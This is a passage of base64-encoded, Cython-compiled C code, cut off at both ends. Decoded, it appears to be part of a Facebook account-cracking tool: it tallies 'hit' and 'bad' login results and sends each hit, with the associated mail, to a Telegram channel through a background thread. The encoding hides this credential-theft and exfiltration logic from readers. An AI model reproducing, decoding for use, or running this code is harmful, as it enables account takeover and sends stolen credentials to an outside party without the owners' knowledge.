Hl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihf""X3B5eF90XzE2KTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTcgPCAwKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSAoIV9fcHl4X3RfMTcpOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xMSkpIHsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF80KTsKICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8yID0gMDsgIF9fcHl4X3RfNCA9IDA7IAogICAgICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wzOV9leGNlcHRpb25faGFuZGxlZDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fcHl4X0w0MF9leGNlcHRfZXJyb3I6OwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNSwgX19weXhfdF8xNCwgX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w1X2Vycm9yOwogICAgICAgICAgICAgICAgX19weXhfTDM5X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTUsIF9fcHl4X3RfMTQsIF9fcHl4X3RfMTMpOwogICAgICAgICAgICAgICAgX19weXhfTDQ1X3RyeV9lbmQ6OwogICAg""ICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAgewogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmIChfX3B5eF90XzEyKSB7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZ290byBfX3B5eF9MMzc7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fcHl4X0wzNzo7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ290byBfX3B5eF9MNDk7CiAgICAgICAgICAgIF9fcHl4X0wzMl9lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDVfZXJyb3I7CiAgICAgICAgICAgIF9fcHl4X0w0OTo7CiAgICAgICAgICB9CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzIgPSBOVUxMOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgICAgX19weXhfdF8xID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaXRfY291bnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2Jq""ZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfY291bnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfMjAgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIwKSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIwKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fcHl4X3RfMjJbMF0gPSBfX3B5eF90XzE4OwogICAgICAgICAgX19weXhfdF8yMlsxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSElUXzI7CiAgICAgICAgICBfX3B5eF90XzIyWzJdID0gX19weXhfdF8zOwogICAgICAgICAgX19weXhfdF8yMlszXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQkFEX0ZCXzI7CiAgICAgICAgICBfX3B5eF90XzIyWzRdID0gX19weXhfdF8yMDsKICAgICAgICAgIF9fcHl4X3RfMjJbNV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X01BSUw7CiAgICAgICAgICBfX3B5eF90XzIyWzZdID0gX19weXhfdl9COwogICAgICAgICAgX19weXhfdF8yMls3XSA9IF9fcHl4X3RfMjE7CiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeVVuaWNvZGVf""Sm9pbihfX3B5eF90XzIyLCA4LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE4KSArIDYgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzMpICsgMTIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzIwKSArIDEwICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdl9CKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMjEpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xOCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8zKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIwKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X0IpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMjEpKTsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICBfX3B5eF90XzUgPSAxOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90XzZ9OwogICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYl9TRU5UX0FfSElUX2JfYl9NYWlsX2IsIF9fcHl4X3ZfQik7IGlmICh1bmxpa2VseSghX19w""eXhfdF80KSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9QLCAoKFB5T2JqZWN0KilfX3B5eF90XzQpKTsKICAgICAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzIgPSBOVUxMOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDkwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgICAgICAgIF9fcHl4X3RfMjAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMjEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjApKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbmRfdGVsZWdyYW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgX19weXhfdF8zID0gUHlUdXBsZV9OZXcoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDkwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3ZfUCk7CiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3ZfUCk7CiAgICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShfX3B5eF90XzMsIDAsIF9fcHl4X3ZfUCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0w1X2Vycm9yKTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDE7CiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yMCkpKSB7CiAgICAgICAgICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMjApOwogICAgICAgICAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIwKTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAg""ICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMjAsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCA5MCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGFyZ2V0LCBfX3B5eF90XzIxLCBfX3B5eF90XzE4LCBfX3B5eF9jYWxsYXJncysxLCAwKSA8IDApIF9fUFlYX0VSUigwLCA5MCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FyZ3MsIF9fcHl4X3RfMywgX19weXhfdF8xOCwgX19weXhfY2FsbGFyZ3MrMSwgMSkgPCAwKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF8yMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzE4KTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X3RfNjsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgICAgICAgX19weXhfdF81ID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMSwgTlVMTH07CiAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9f""cHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGFydCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDkwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICB9CiAgICAgICAgX19weXhfTDEzOjsKCiAgICAgICAgCiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxMl90cnlfZW5kOwogICAgICBfX3B5eF9MNV9lcnJvcjo7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzQsICZfX3B5eF90XzYsICZfX3B5eF90XzEpOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMjAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDdfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMCk7CiAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMjAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SZXF1ZXN0RXhjZXB0aW9uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MN19leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgX19QeXhfREVDUkVGKF9f""cHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgX19weXhfdF8yMyA9IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhfX3B5eF90XzQsIF9fcHl4X3RfMTgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfNCwgX19weXhfdF82LCBfX3B5eF90XzEpOwogICAgICBfX3B5eF90XzQgPSAwOyBfX3B5eF90XzYgPSAwOyBfX3B5eF90XzEgPSAwOwogICAgICBpZiAoX19weXhfdF8yMykgewogICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2EuaGkyX2ZiIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xLCAmX19weXhfdF82LCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDdfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgIF9fcHl4X3ZfUSA9IF9fcHl4X3RfNjsKICAgICAgICAgewoKICAgICAgICAgIAogICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE4LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbG9jayk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDU1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMTgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNTVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19weXhfdF8zID0gTlVMTDsKICAgICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MNTdfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgICAgICAgICAgX19weXhfdF81ID0gMTsKICAgICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMjEpKSkgewogICAgICAgICAgICAgIF9fcHl4X3RfMyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMjEpOwogICAgICAgICAgICAgIGFz""c2VydChfX3B5eF90XzMpOwogICAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yMSk7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICAgICAgX19QeXhfS